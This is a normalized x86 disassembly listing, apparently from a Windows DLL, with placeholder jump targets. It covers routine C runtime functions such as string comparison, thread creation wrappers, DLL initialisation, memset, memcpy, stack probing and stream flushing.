cmp [ rw-data ] 0x0
jne r-xdata
sub_10010024
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_10013426
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_100130ac
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_10012940
mov [ esi + 0x4 ] eax
sub_100100ab
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
mov ebx [ ebp + 0x8 ]
xor esi esi
cmp ebx esi
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi esi
jne r-xdata
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001376a
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
inc ebx
push eax
inc ebx
call sub_1001376a
add esp 0x10
inc edi
inc edi
movzx eax ax
test si si
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp si ax
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
inc ebx
inc ebx
inc edi
inc edi
movzx eax ax
test si si
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
cmp si ax
je r-xdata
add eax 0x20
jmp r-xdata
sub_100101bc
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100100ab
add esp 0xc
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
pop edi
pop esi
pop ebp
retn
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
movzx eax ax
cmp cx si
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx ax
je r-xdata
add eax 0x20
sub_1001024f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_100133ad
test eax eax
je r-xdata
push rw-data
call sub_10013a10
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
push eax
call sub_1001356f
pop ecx
call [ rw-data ]
sub_100102cd
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10013238
call sub_10013232
push eax
call sub_10013218
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_10013440
mov esi [ ebp + 0x8 ]
push esi
call sub_10013232
push eax
call sub_1001326c
test eax eax
jne r-xdata
call sub_1001028c
push rw-data
call sub_10013a10
pop ecx
test eax eax
je r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call [ rw-data ]
cmp [ rw-data ] 0x0
je r-xdata
sub_10010350
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
push esi
call sub_10013238
push 0x214
push 0x1
call sub_10013c93
mov esi eax
pop ecx
pop ecx
cmp esi ebx
je r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
xor eax eax
jmp r-xdata
push esi
call sub_1000fe7d
pop ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
call sub_10013426
push [ eax + 0x6c ]
push esi
call sub_100132c6
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
cmp eax ebx
jne r-xdata
pop edi
pop ebx
leave
retn
xor eax eax
push [ ebp - 0x4 ]
call sub_100112c5
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_100102cd
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
sub_10010400
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_10010024
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1001129f
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10014189
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_100141d4
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10014144
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10010515
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10010400
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_10010541
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
xor edi edi
push r--data
lea eax [ ebp - 0x4 ]
push edi
push eax
mov [ ebp - 0x4 ] edi
xor esi esi
call sub_100148af
add esp 0xc
cmp eax edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ecx
cmp eax edi
jne r-xdata
cmp eax 0x16
jne r-xdata
push ebx
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edi
cmp ecx edi
je r-xdata
cmp ecx edi
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1001382e
add esp 0x14
push edi
lea ecx [ ebp - 0x14 ]
mov eax r--data
push ecx
push eax
push edi
mov [ ebp - 0x14 ] eax
call sub_1001428c
add esp 0x10
mov esi eax
call sub_1001129f
mov ebx [ eax ]
call sub_1001129f
mov [ eax ] edi
push edi
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x14 ]
push edi
call sub_1001457e
add esp 0x10
mov esi eax
call sub_1001129f
cmp esi 0xffffffff
je r-xdata
push [ ebp - 0x4 ]
call sub_1000fe7d
pop ecx
pop edi
mov eax esi
pop esi
leave
retn
push edi
push ecx
call sub_1001479f
mov esi eax
neg esi
pop ecx
sbb esi esi
pop ecx
inc esi
jmp r-xdata
cmp [ eax ] 0x2
je r-xdata
mov [ eax ] ebx
jmp r-xdata
call sub_1001129f
mov [ eax ] ebx
call sub_1001129f
cmp [ eax ] 0xd
jne r-xdata
pop ebx
sub_10010621
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
inc ecx
inc ecx
inc edx
inc edx
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_1001067e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10014a0f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10014a84
pop ecx
sub_100106c2
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1000ff5a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_100126f2
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_100106a5
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_10014bcd
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_10010658
push sub_10019e7a
call sub_10014bb6
pop ecx
sub_10010727
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov esi ecx
push 0x2d
pop edx
mov [ ecx ] dx
add ecx 0x2
neg eax
add edx 0x30
add edx 0x57
jmp r-xdata
xor edx edx
div [ ebp + 0x8 ]
cmp edx 0x9
jbe r-xdata
xor eax eax
mov [ ecx ] ax
dec ecx
dec ecx
mov [ ecx ] dx
inc ecx
inc ecx
test eax eax
ja r-xdata
mov dx [ esi ]
movzx eax [ ecx ]
mov [ ecx ] dx
dec ecx
mov [ esi ] ax
dec ecx
inc esi
inc esi
cmp esi ecx
jb r-xdata
pop esi
pop ebp
retn 0x8
sub_1001077b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
mov ecx [ ebp + 0xc ]
call sub_10010727
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_100107a5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
push eax
call sub_100112e8
pop ecx
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_100135dd
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_10013238
push 0x214
push 0x1
call sub_10013c93
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
dec [ rw-data ]
cmp [ rw-data ] edi
jne r-xdata
call sub_100153c1
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1001528a
mov [ rw-data ] eax
call sub_10014cb5
test eax eax
jge r-xdata
call sub_10011318
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
xor eax eax
inc eax
push edi
call sub_1001356f
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1001319d
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_100124a2
call sub_100151cf
test eax eax
jl r-xdata
call sub_10013289
jmp r-xdata
push esi
call sub_1000fe7d
pop ecx
jmp r-xdata
push edi
push esi
call sub_100132c6
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
call sub_10014f09
call sub_10013289
call sub_10011318
jmp r-xdata
call sub_10014f09
jmp r-xdata
call sub_10014f57
test eax eax
jl r-xdata
push 0x0
call sub_100122db
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_100108da
push 0xc
push r--data
call sub_10012000
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10001af1
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_100107a5
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_100107a5
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10001af1
push edi
push 0x0
push ebx
call sub_100107a5
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_10012045
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_100108da
pop ecx
pop ebp
retn 0xc
call sub_1001540d
sub_10010a00
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_100154fa
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_10010a80
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_10010ab0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10010b38 ]
jmp [ ecx * 4 + jump_table_10010bb8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10010c24 ]
pop esi
pop edi
pop ebp
jmp sub_100156cf
jmp [ ecx * 4 + jump_table_10010dc0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10010cc4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10010dc0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10010c24 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10010dc0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10010c24 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10010c24 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10010c24 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10010dc0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10010dc0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10010dc0 ]
sub_10010e15
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_10015fc1
pop ecx
push eax
call sub_10015ee5
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10010e7d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10010e15
pop ecx
test eax eax
je r-xdata
push esi
call sub_10010ec5
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_10015fc1
push eax
call sub_10015ff3
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_10010ec5
push 0x14
push r--data
call sub_10012000
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_10011508
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10010f96
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_10012045
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_100110ba
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_10010f67
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_10010e7d
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_10010e7d
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_10010fa8
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_10013c93
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_10013c93
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_10011079
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_10011508
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_100110ba
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_10011508
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_100110ec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1001142e
pop ecx
pop ebp
retn
sub_10011128
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_1001142e
pop ecx
pop ebp
retn
sub_10011157
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
